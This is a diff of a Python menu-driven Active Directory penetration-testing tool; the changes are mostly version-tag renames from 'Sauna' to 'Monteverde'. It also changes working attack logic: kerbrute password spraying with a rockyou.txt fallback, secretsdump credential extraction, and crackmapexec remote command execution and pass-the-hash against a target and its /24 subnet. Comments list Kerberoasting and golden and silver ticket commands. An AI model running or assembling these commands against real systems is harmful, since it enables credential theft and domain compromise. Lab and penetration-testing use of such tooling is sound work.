@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -27,7 +27,7 @@ from termcolor import colored					# pip install termcolor
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -48,7 +48,7 @@ BUG = 0			# BUGHUNT ON/OFF
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Create function calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -262,7 +262,7 @@ def options():
    print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat  " + '\u2551')
    print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRM   " + '\u2551')
    print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PsEcec HASH  (65) Desktop " + '\u2551')
-   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExwc HASH (66)         " + '\u2551')
+   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExec HASH (66)         " + '\u2551')
    print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASh (67)         " + '\u2551')
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
    print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) User Editor  (69) Autofill" + '\u2551')
@@ -376,7 +376,7 @@ def stage3():
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna                                                                
+# Version : Monteverde                                                                
 # Details : Display universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -393,7 +393,7 @@ print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -454,7 +454,7 @@ PA   = [" "*COL4]*MAX
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -512,7 +512,7 @@ input("\nPlease ENTER key to continue...")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Sauna
+# Version : Monteverde
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -528,7 +528,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -562,7 +562,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -583,7 +583,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -601,7 +601,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -622,7 +622,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -640,7 +640,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -658,7 +658,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -679,7 +679,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -697,7 +697,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -715,7 +715,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote Windows USER to impersonate.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -733,7 +733,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change the remote windows COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -751,7 +751,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -770,7 +770,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -792,7 +792,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -807,7 +807,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -830,7 +830,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -845,7 +845,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -860,7 +860,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -875,7 +875,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -890,7 +890,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Full, slow and comprehensive nmap scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -905,7 +905,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - getArch.py -target IP
 # Details : 32/64 bit
 # Modified: N/A
@@ -918,7 +918,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -930,7 +930,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -942,7 +942,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -954,7 +954,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -966,7 +966,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1065,7 +1065,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1077,7 +1077,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1089,7 +1089,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1101,7 +1101,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1115,7 +1115,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
@@ -1128,7 +1128,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1140,7 +1140,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1163,7 +1163,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1204,7 +1204,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1216,7 +1216,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
@@ -1229,7 +1229,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: 
 # -------------------------------------------------------------------------------------
@@ -1241,7 +1241,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1253,7 +1253,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1265,7 +1265,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1277,7 +1277,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1289,7 +1289,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1327,24 +1327,25 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
       print("\n[+] Trying all usernames with matching passwords first...")
-      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt  -passwords users.txt -outputfile passwords.txt")
-      test = os.path.exists("passwords.txt")
-      if test != 1:
+      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile passwords.txt")
+      test = linecache.getline("passwords.txt", 1)
+      if test == "":
          print("\n[+] Now trying all users with random passwords...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+      os.remove("passwords.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1362,7 +1363,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1380,7 +1381,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1402,7 +1403,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
@@ -1444,7 +1445,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1456,7 +1457,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
 # Details : Silver Ticket!! 
 # Modified: N/A
@@ -1496,7 +1497,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1534,7 +1535,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1558,7 +1559,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1572,7 +1573,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1584,13 +1585,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      print("\n[*] Please wait...")
+      print("\n[*] Please wait, this can take sometime...")
       command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
 
       command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
@@ -1630,23 +1631,31 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
-# Details : Menu option selected - crackmapexec smb IP -u IMPERSONATE -H HASH -x 'net user Administrator /domain' --exec-method smbexec
+# Version : Monteverde
+# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers
+# Details :                        crackmapexec smb IP -u Administrator -p password --local-auth --shares
+# Details :                        crackmapexec smb IP -u Administrator -H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      print("\n[+] Trying user " + USR.rstrip(" ") + " with password '" + PAS.rstrip(" ") +"'...\n")
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --local-auth --shares")
+      print("\n[+] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
+
+      command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
       
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
+      print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
       HASH = " " # Reset Value
 
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
       if HASH[:1] != " ":
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain' --exec-method smbexec")
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
       else:
          print("[-] No NTLM HAS was found for user " + IMP.rstrip(" ") + "...")
       prompt()
@@ -1654,7 +1663,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1678,7 +1687,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1702,7 +1711,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1726,7 +1735,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - crewl -d 3 -m5 -w textfile.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1750,7 +1759,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Nano users.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1767,7 +1776,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - pftb IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1779,7 +1788,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ssh -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1791,7 +1800,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - telnet -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1803,7 +1812,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nc IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1815,7 +1824,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1827,7 +1836,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1839,7 +1848,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1850,7 +1859,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1861,7 +1870,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Autofill parameters.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
